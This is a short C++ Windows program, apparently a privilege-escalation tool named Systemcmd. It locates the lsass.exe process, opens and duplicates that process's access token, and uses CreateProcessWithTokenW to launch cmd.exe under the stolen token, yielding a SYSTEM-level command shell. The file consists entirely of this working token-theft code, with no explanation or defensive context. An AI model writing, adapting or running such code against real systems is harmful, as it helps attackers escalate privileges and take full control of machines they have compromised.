// Systemcmd.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Windows.h"
#include <tlhelp32.h>
#include "iostream"

using namespace::std;

BOOL FindProcessPid(LPCWSTR ProcessName, DWORD& dwPid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return(FALSE);
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return(FALSE);
	}

	BOOL    bRet = FALSE;
	do
	{
		if (!lstrcmp(ProcessName, pe32.szExeFile))
		{
			dwPid = pe32.th32ProcessID;
			bRet = TRUE;
			break;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return bRet;
}

HANDLE GetProcessToken(DWORD Pid)
{
	HANDLE Pstoken = {};
	
	if (!OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid)) {
		cout << "OpenProcess ERROR " << endl;
		return (HANDLE)NULL;
	}
	if (!OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid), TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &Pstoken)) {
		cout << "OpenProcessToken ERRO "<< endl;
		return (HANDLE)NULL;
	}
	return Pstoken;
}

void Run(HANDLE Token) {
	if (!DuplicateTokenEx(Token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &Token)) {
		cout << "DuplicateTokenEx ERROR " << endl;
	}
	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(Token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret) {
		cout << "CreateProcessWithTokenW ERROR" << endl;
	}
}




int main()
{
	LPCWSTR Name = L"lsass.exe";
	DWORD pid = 0;
	FindProcessPid(Name, pid);
	HANDLE token = GetProcessToken(pid);
	Run(token);
    return 0;
}

